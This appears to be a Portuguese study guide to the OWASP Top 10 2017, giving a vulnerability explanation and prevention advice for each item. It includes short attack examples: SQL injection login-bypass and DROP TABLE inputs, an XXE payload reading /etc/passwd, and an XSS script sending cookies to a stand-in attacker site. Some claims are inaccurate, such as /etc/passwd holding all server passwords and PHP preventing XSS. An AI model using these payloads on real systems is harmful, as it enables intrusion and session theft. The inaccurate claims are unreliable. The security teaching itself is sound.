# OWASP TOP 10 2017

## A1 - Injection
Como funciona: 

Imagina que em uma aplicação web, na página de Login, o Front-End fornece o email e senha que o usuário digitou para o Back-End, que irá montar a query e executar no banco de dados
então imagine que a query que o backend monta é essa:

  
    var email = request.getParameter('email')
    var senha = request.getParameter('senha')
    var sql = 'select * from Users where email = '" + email + "' and senha = '" + senha + "';
  
se o usuário digitar o seguinte comando no campo de email:

    ' or admin=true#

e qualquer coisa no campo senha, a query ficará assim: 

    'select * from Users where email = '' or admin=true#'and senha = '263721638712'

e conseguirá entrar no site pois a query retorna um usuário admin, isso é um SQL injection

chutando que o banco de dados, na tabela user tenha um campo booleano chamado admin

outro comando que poderia ser inputado é: 

    '; drop table Usuarios;#

mas esse problema nao é só em SQL, no NoSQL tambem, no terminal bash e qualquer serviço que o cliente passa informação e será executado em algum lugar

em NoSQL tem exemplo de injection nesse link: https://mongoplayground.net/p/Nq_-Ghhq9rW

## Como se prevenir: 

Sanitizar os dados, mas não criar sua própria sanitização e nunca concatenar strings na unha! Existem ferramentas já prontas que fazem a sanitização do comando SQL antes de rodar, em Java por exemplo:

    String comando = "select * from clientes where id = ?";
    PreparedStatement p = conn.prepareStatement(comando);
    p.setString(1, cliente.getId())

o PreparedStatement é API que vai sanitizar e impedir um SQL injection

outra forma de se prevenir é migrar para um ORM, o Hibernet tem vulnerabilidade a SQL injection se você fizer na unha a concatenação de string, mas na própria documentação mostra forma de sanitizar o comando

## A2 - Broken Authenticator
esse tipo de ataque mostra algumas vulnerabilidades, por exemplo:

  - se sua aplicação aceita senhas muito fáceis
  
    significa q alguem pode descobrir e invadir a aplicação
     
    no momento q vc aceita senhas comuns, usuarios vao usar senhas comuns e vc tem 1 vulnerabilidade, e sim, teoricamente nao eh culpa da aplicação, mas se quer tapar o maximo de buracos possiveis, entao nao deixe q ele crie senha facil

  - se sua aplicação permite ataque brute force

  - salvar senha em texto puro no banco (veja A3)

  - nao ter autenticacao multifatores

  - expor ID's de sessao na URL
      imagina q na sua aplicacao tem uma URL assim: 

        app.com/home?sessionid=7389784973298742913

      esse parametro pode estar visivel em servicos de logs
      e essa sessao identifica um usuario, entao se alguem pega essa URI e acessar, vai estar acessando como aquele usuario...
      
  - se a app nao gera um sessionID novo depois do login com sucesso

  - se a app nao invalidar a sessionID depois do usuario fazer logout

  - se a app nao tem timeout de sessionID
     
    OBS: antigamente era considerado uma boa pratica fazer o usuario trocar de senha de X em X tempo, mas hoje em dia não é mais recomendado, pois isso encorajava os usuários a utilizar senhas fracas, e reutilizar senhas, inves disso, utilize multifactor authenticator

## Como se prevenir: 
  - implementar multifactor
    só isso ja inviabiliza as 3 primeiras vulnerabilidades, pois podem ate saber a senha, mas o codigo de autenticacao eh bem dificil

  - nunca utilizar usuario e senha padrao nos serviços, seja de banco de dados, fila, qualquer serviço da aplicação, como admin/admin por exemplo.

  - implementar check se a senha é facil e apenas deixar cadastrar senhas fortes

  - evitar dizer na mensagem "este usuario nao existe", pois isso é uma informação a mais para o hacker... ou "senha incorreta", o certo eh dizer "usuario e senha invalidos", e tomar cuidado tambem com a parte de recuperacao de senha, la tambem pode descobrir se o usuario existe na plataforma

  - diminuir o limite de logins falhos, e se vc ver q alguem tentou logar 3 milhoes de vezes com o mesmo usuario, bloqueia esse IP! [Semelhante como nos defendemos de um ataque DDoS](https://github.com/DeveloperArthur/arquitetura-escalabilidade-com-php?tab=readme-ov-file#melhorando-disponibilidade-da-aplica%C3%A7%C3%A3o)

  - logar na aplicação sempre que alguém tentar se logar como administrador, eh importante saber que alguem tentou se logar como administrador!

  - nao ter sessionID na url, gerar novo sessionID após login com sucesso, ter timeout para o sessionID e devem ser invalidados no servidor tambem, nos momentos adequados

## A3 - Sensitive Data Exposure (exposicao de dados sensiveis)
  - senhas nao encriptadas gravadas no banco

  - no formulario de login nao ter HTTPS (o ideal eh q tenha HTTPS na app inteira)
    pois entre o servidor web e o servidor backend, tem a rede, que vai enviar esses dados e eles precisam estar criptografados (https)
    se nao, esta vulneravel a ataques "man in the middle", a pessoa fica no meio, nos intermediarios, onde a rede envia dados, pra tentar pegar algo

  - nao seguir LGPD

  - senhas nao encriptadas armazenadas em backups etc

  - usar algoritmos de criptografia fracos, que ja foram quebrados

  - conseguir acessar o site com http, o certo é redirecionar para o https

  - nao ter garantia de certificado
    
    OBS: outra coisa q devemos fazer tambem eh criptografar numero de cartao de credito com algoritmo q consegue descriptografar
    mas nao usar o recurso automatico de criptografia do banco de dados, pois se nao abre brecha para SQL injection
    criptografar e descriptografar no backend!

## Como se prevenir: 
(algumas vulnerabilidades acima ja sao auto explicativas de como prevenir):
  - usar algoritmos de encriptacao atualizados e fortes (scrypt, argon2, bcrypt, PBKDF2)

  - desabilitar cache para requests que possuem dados sensiveis

  - nao armazenar dados desnecessarios
    se vc só precisa da informacao em um momento, nao armazena

    as vezes o provedor de pagamentos da um token pro cartao de credito
    
    ai guarda o token no banco, pois o numero do cartao vc nao vai usar de novo

## A4 - XML External Entities (XEE)
a ENTITY com o comando SYSTEM permite que um parser de xml carregue informacoes do sistema operacional do servidor e injete nas variaveis, entao, se sua aplicação receber um XML desse:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE client [ <!ENTITY xee SYSTEM "file:///etc/passwd"> ]>
    <client>
      <username>arthur.almeida</username>
      <name>Arthur</name>
      <lastname>Tatay</lastname>
      <score>100</score>
      <foo>&xee;</foo>
    </client>

o parser de XML vai ler a ENTITY, pegar o conteudo desse arquivo ``file:///etc/passwd`` e colocar dentro do campo ``<foo>``

ou seja, todas as senhas do servidor estarao gravas no campo ``<foo>``

## Como se prevenir: 
  - desativar xml external entity e DTD processing em todos os xmls parsers da aplicação: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

  - usar SAST para detectar essas vulnerabilidades

  - se nao for possivel fazer esses passos acima, use um api security gateway ou WAFs

## A5 - Broken Access Control
essa vulnerabilidade é basicamente controle de permissões 
  - áreas logadas:

    não deixar qualquer um acessar páginas (através de URL) que só deveriam ser acessadas pelo usuário logado, validar permissão de acesso com perfil

  - má configurações de CORS:

    permitindo que pessoas indevidas acessem a API que não deveria
    
## Como se prevenir: 
  - controle de área logada

  - com excecao de recursos publicos, fechar todos os acessos por padrão

  - liberar CORS só para o necessário

  - token JWT deve ser invalidado depois que usuário fez LOGOUT

  - desabilitar web server directory listing

  - time de QA e devs incluirem testes de controle de acesso de unidade e integração

    OBS: SAST e DAST podem perceber a ausência desse controle, mas não validam se esta funcionando

## A6 - Security misconfiguration
as vulnerabilidades são:
  - recursos desnecessários instalados (portas, programas, serviços, páginas, privilégios)

  - usuário com senha padrão admin/admin (veja A2)

  - [mostrar stack trace de erros para usuário, mostrando nomes de classes, parametros, metodos](https://www.linkedin.com/posts/arthursantosalmeida_expor-a-tecnologia-usada-no-seu-software-activity-7399555601808261120-_o2k)

  - directory listing não estar desabilitado no servidor (veja A5)

  - software estar desatualizado ou vulnerável (veja A9)

## Como se prevenir: 
  - ter um ambiente igual produção para testar falhas de segurança

  - apenas recursos necessarios instalados no servidor

  - verificar as permissões dos serviços de storage de cloud (S3, cloud storage, blob storage)

## A7 - Cross-Site Scripting (XSS)
qualquer site, serviço ou sistema que interpreta/executa/invoca/carrega/ código dinâmico, está suscetível a esse tipo de ataque

basicamente nos campos de input de HTML, o atacante irá escrever tag como ``<script> **e colocar codigo JS aqui** </script>``

ele pode injetar código JS no HTML, assim: 

    <script>document.location=https://site-do-atacante.com?foo=document.coockie</script>
  
  dessa forma pegando os todos os coockies do usuário, pegando sessions de logins etc

## Como se prevenir: 
  - use tecnologias q previnem esse ataque, como Ruby On Rails, React.js, ASP.NET, JSP, PHP

  - habilitar CSP (Content-Security-Policy)

## A8 - Insecure Deserialization

Deserialization é o processo de converter ``JSON``/``XML``/``String`` etc em um objeto do meu sistema

esse ataque é bem parecido com A1 e A4, pois por meio de ``JSON``/``XML``/``String``, fazemos um injection de código que executa algo, e no momento da deserialization, muda o comportamento da aplicação

adulterando dados, modificando informações e salvando no banco de uma forma que não deveria

## Como se prevenir: 
  - não aceitar objetos serializados de fontes q você não confia

  - implementando checagem de integridade dos dados

  - isolar e rodar código de deserialization em ambientes com baixo privilégio quando possível

  - logar todas as falhas e exceptions de deserialization, pois pode ser um ataque

  - restringir e monitorar dados entrando e saindo dos servidores que deserializam
  
    pra poder ver, se processo de deserialization que antes devolvia 4 bytes, agora está retornando 1MB, tem algo de estranho!

## A9 - Using Components with Known Vulnerabilities 
  - não saber as versões de todos componentes que você usa, tanto no front quanto no back, e todos os serviços, DB, fila etc

  - usar tecnologias que possuem vulnerabilidades, ou estão sem suporte, ou desatualizado, abandonado (OS/web/application server/database)

  - não fazer SCAN do software, para ver se há vulnerabilidades, e não tem relatórios de segurança sobre os componentes que você usa

  - não atualiza os frameworks, linguagens e dependências que utiliza baseado em riscos

  - configurações mal feitas de segurança (veja A6)
  
## Como se prevenir: 
  - remover dependências desnecessárias, documentos, arquivos, componentes desnecessários 

  - monitorar continuamente serviços como CVE e NVD para saber sobre vulnerabilidades, se inscrever em alertas de email sobre segurança 

  - utilizar somente componentes de fontes oficiais em links seguros

## A10 - Insuficient logging and monitoring
  - se sua aplicação não tem logging de logins, falha de logins, todo tipo de atividade de alto valor

  - logs das aplicações não são monitoradas para atividades suspeitas

  - logs estão sendo logados apenas no console do servidor

  - não tem alerta nos logs 

  - testes de penetração e serviços de SCAN como DAST não disparam alertas

## Como se prevenir: 
  - logar tentativas falhas de login e todo tipo de atividade de alto valor (veja A2 e A8)

  - utilizar ferramenta de monitoramento

  - utilizar algum serviço de logging, para as infos não serem logadas apenas no servidor

  - definir valores de alerta nos logs para você ficar sabendo

  - disparar alertas quando testes de penetração e SCAN DAST falharem
